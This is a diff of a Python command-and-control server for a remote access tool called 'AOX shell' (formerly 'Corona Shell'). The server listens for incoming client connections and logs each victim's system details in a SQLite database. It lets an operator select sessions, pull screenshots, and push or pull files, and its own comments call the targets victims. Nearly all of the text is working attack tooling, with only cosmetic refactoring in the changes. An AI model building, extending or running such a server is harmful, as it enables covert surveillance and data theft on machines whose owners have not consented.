@@ -15,17 +15,10 @@ from prettytable import from_db_cursor
 
 
 
-art = """
-     █████╗  ██████╗ ██╗  ██╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
-    ██╔══██╗██╔═══██╗╚██╗██╔╝     ██╔════╝██║  ██║██╔════╝██║     ██║     
-    ███████║██║   ██║ ╚███╔╝█████╗███████╗███████║█████╗  ██║     ██║     
-    ██╔══██║██║   ██║ ██╔██╗╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
-    ██║  ██║╚██████╔╝██╔╝ ██╗     ███████║██║  ██║███████╗███████╗███████╗
-    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
-"""
 
 
-print(art)
+
+
 
 user_guide = """
     Corona Shell Commands
@@ -50,18 +43,34 @@ client_conn_object.append("")
 image_counter = 0
 
 
+
+def print_art():
+    art = """
+     █████╗  ██████╗ ██╗  ██╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
+    ██╔══██╗██╔═══██╗╚██╗██╔╝     ██╔════╝██║  ██║██╔════╝██║     ██║     
+    ███████║██║   ██║ ╚███╔╝█████╗███████╗███████║█████╗  ██║     ██║     
+    ██╔══██║██║   ██║ ██╔██╗╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
+    ██║  ██║╚██████╔╝██╔╝ ██╗     ███████║██║  ██║███████╗███████╗███████╗
+    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+    """
+
+
+
 #create socket and listen for connection
 def create_socket():
     global sock
+    
     try:
         port = 4000
-        host = socket.gethostbyname(socket.gethostname())
+        host = "192.168.43.172"
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind((host, port))
-        sock.listen(200) #listen for connection
+        sock.listen(5) # listen for connection
         print("[+]Listening for a connection... \n")
     except socket.error as err:
         print("[-]Error unable to create socket!!!" + str(err))
+
+
 
 #accept connection
 def accept_connections(client_database_conn):
@@ -71,12 +80,19 @@ def accept_connections(client_database_conn):
             conn.setblocking(True)
             data = conn.recv(1024).decode()#recieves client system information
             client_info = format_client_info(data)#formats client to be stored in the database
+
+            print(client_info)
+
             ip = re.findall("'(.*?)'", str(addr))#extract ip from addr
             ip = "".join(ip)#converts ip into string
+
             store_client_info(client_database_conn, ip, conn, client_info)#stores client data into database
             print("\n[+]Node " + str(addr) + " has just connected!!!")
-        except:
+
+        except Exception as e:
+            print(e)
             print("[-]Something went wrong connecting to client!!!")
+
 
 
 #creates database where connected client info will be stored
@@ -92,7 +108,6 @@ def create_database():
                         Node_Name TEXT NULL,
                         Release TEXT NULL,
                         Version TEXT NULL,
-                        Machine TEXT NULL,
                         Processor TEXT NULL
                         );
                         """)
@@ -101,13 +116,16 @@ def create_database():
     client_database_conn.commit()#commits changes to database
     return client_database_conn#socket connection object
 
+
+
 #store client information in database when a new connection is made
 def store_client_info(client_database_conn, ip, conn, client_sysinfo_list):
    cursor = client_database_conn.cursor()
    client_conn_object.append(conn)#add client conn to list as socket obejct cant be stored in the database
    #insert client info into database
-   cursor.execute("INSERT INTO connectedClients(IP_Address, System, Node_Name, Release, Version, Machine, Processor) VALUES(?, ?, ?, ?, ?, ?, ?)", (ip, str(client_sysinfo_list[0]), str(client_sysinfo_list[1]), str(client_sysinfo_list[2]), str(client_sysinfo_list[3]), str(client_sysinfo_list[4]), str(client_sysinfo_list[5])))
+   cursor.execute("INSERT INTO connectedClients(IP_Address, System, Node_Name, Release, Version, Processor) VALUES(?, ?, ?, ?, ?, ?)", (ip, str(client_sysinfo_list[0]), str(client_sysinfo_list[1]), str(client_sysinfo_list[2]), str(client_sysinfo_list[3]), str(client_sysinfo_list[4])))
    client_database_conn.commit()#commints changed
+
 
 
 #retrive and display all client information in the database
@@ -127,6 +145,7 @@ def get_client_info(client_database_conn):
     print(connected_client)
 
 
+
 #formats client info in the right order to be saved in the database
 def format_client_info(client_info):
     formatted_data_list = []
@@ -139,11 +158,14 @@ def format_client_info(client_info):
     return formatted_data_list
 
 
+
 #sends null to the client and get the current working directory in return
 def send_null(client_conn):
         client_conn.send(str(" ").encode())
         data = client_conn.recv(1024).decode()
         print(str(data), end="")
+
+
 
 #establish a session with selected
 def get_target_client(target_id):
@@ -153,6 +175,8 @@ def get_target_client(target_id):
     except:
         print("[-]Client does not exist!!!")
         return None
+
+
 
 def receive_client_image(client_conn):
     global image_counter
@@ -170,6 +194,7 @@ def receive_client_image(client_conn):
             data = client_conn.recv(1024)
         file.close()
     print("[+]Image received!!!")
+
 
 
 #sends file from server to victim's machine
@@ -197,6 +222,7 @@ def send_file(conn, usrFile):
                         data = file.read(1024)
                     file.close()
                 print("[+]Data sent!!!")
+
 
 
 #recieves file from victim's machine
@@ -292,18 +318,30 @@ def client_session(client_conn):
 
 
 
+def style_text(text):
+    return f"\033[1;33m{text}\033[0m"
+
+
+
 def main():
     client_database_conn = create_database()
     t3 = threading.Thread(target=accept_connections, args=(client_database_conn,))
     t3.start()
+
     while True:
-        print("\033[1;32mCorona>\033[1;m", end="")
+        print(f"{style_text('AOX: ')}", end="")
+
         cmd = input()
         cmd = cmd.lower() #convert input to lower case
-        if cmd == 'list':
+        if cmd == '':
+            pass
+
+        elif cmd == 'list':
             get_client_info(client_database_conn)
+
         elif 'guide' in cmd:
             print(user_guide)
+
         elif 'select' in cmd:
             target_id = re.findall("\d", cmd)
             target_id = ''.join(target_id)
@@ -313,5 +351,7 @@ def main():
             print("[-]Invalid command!!!")
 
 
+
+print_art()
 create_socket()
 t2 = threading.Thread(target=main).start()
